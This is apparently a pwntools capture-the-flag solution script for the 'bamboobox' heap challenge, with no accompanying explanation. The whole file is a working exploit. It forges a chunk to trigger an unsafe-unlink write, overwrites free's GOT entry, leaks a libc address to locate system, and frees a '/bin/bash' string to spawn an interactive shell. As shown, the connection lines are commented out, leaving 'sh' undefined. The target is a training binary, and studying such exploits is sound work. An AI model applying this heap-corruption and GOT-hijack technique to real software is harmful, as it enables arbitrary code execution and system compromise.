from pwn import *

context(arch = 'amd64', os = 'linux', log_level = 'debug')
libc = ELF('./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
ld = ELF('./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so')
elf = ELF("./bamboobox_patch")
#sh = process(elf.path)
#sh = process(argv = [ld.path, elf.path], env = {"LD_PRELOAD" : libc.path})
#sh = remote('node4.buuoj.cn', 26638)
#gdb.attach(sh)

f = lambda size: str.encode(str(size))

atoi_got = elf.got['atoi']
free_got = elf.got['free']

def add(size, content):
    sh.recvuntil(b'Your choice:')
    sh.sendline('2')
    sh.recvuntil(b'Please enter the length of item name:')
    sh.sendline(f(size))
    sh.recvuntil(b'Please enter the name of item:')
    sh.sendline(content)

def edit(idx, size, content):
    sh.recvuntil(b'Your choice:')
    sh.sendline('3')
    sh.sendlineafter(b'Please enter the index of item:', f(idx))
    sh.recvuntil(b'Please enter the length of item name:')
    sh.sendline(str.encode(str(size)))
    sh.recvuntil(b'Please enter the new name of the item:')
    sh.sendline(content)
    pass

def show():
    sh.recvuntil(b'Your choice:')
    sh.sendline('1')
    pass

def delete(idx):
    sh.recvuntil(b'Your choice:')
    sh.sendline('4')
    sh.recvuntil(b'Please enter the index of item:')
    sh.sendline(str.encode(str(idx)))
    pass

def exit():
    sh.recvuntil(b'Your choice:')
    sh.sendline('5')
    pass


add(0x40,b'aaaa')
add(0x80,b'bbbb')
add(0x80,b'cccc')
ptr = 0x6020C8
fd = ptr - 0x18
bk = ptr - 0x10
#gdb.attach(sh)
payload = p64(0) + p64(0x41) + p64(fd) + p64(bk) + p64(0) * 4 + p64(0x40) + p64(0x90)
edit(0, len(payload), payload)
delete(1)
free_got = elf.got['free']
log.info('free got : %x' % free_got)
payload = p64(0) * 2 + p64(0x40) + p64(free_got)
edit(0, len(payload), payload)
show()
sh.recvuntil(b'0 : ')
free_addr = u64(sh.recvuntil(b'\x7f').ljust(8, b'\x00'))
log.info('free addr : 0x%x' % free_addr)
libc_base = free_addr - libc.sym['free']
system_addr = libc_base + libc.sym['system']
log.info("libc_base: 0x%x" % libc_base)
log.info("system addr: 0x%x" % system_addr)
payload = p64(system_addr)[:-1]
edit(0, len(payload), payload)
add(0x20, b'/bin/bash')
delete(1)

sh.interactive()

